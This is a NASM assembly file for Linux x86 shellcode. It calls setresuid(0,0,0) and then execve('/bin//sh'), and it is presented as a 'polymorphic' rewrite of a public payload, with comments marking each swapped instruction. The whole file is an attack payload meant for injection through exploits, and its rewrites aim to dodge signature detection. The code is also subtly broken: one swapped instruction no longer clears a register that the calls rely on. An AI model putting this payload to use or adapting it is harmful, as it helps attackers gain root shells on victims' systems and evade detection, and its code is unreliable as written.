; linux x86 setresuid(0,0,0)-/bin/sh
; Original Shellcode - 35 bytes: http://shell-storm.org/shellcode/files/shellcode-220.php
; Polymorphic Shellcode - 41 bytes
; Author: buffered4ever
; 15-03-2019

global _start

section .text
_start:

	;setresuid(0,0,0)
	sub eax, eax ; changed from xor eax, eax
	mov ebx, eax ; changed from xor ebx, ebx
	xor ecx, ebx ; changed from xor ecx, ecx
	and edx, eax ; changed from cdq  
	add al, 0xa5 ; changed from mov al, 0xa4
	sub al, 1
	int 0x80

	; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
	xor eax, eax
	mov al, 10
	add al, 1 ; changed push byte 11 and pop eax
	push ecx
	push 0x68732f6e ; changed from 0x68732f2fi
	push 0x69622f2f ; changed from 0x6e69622f
	mov ebx, esp
	push ecx
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80

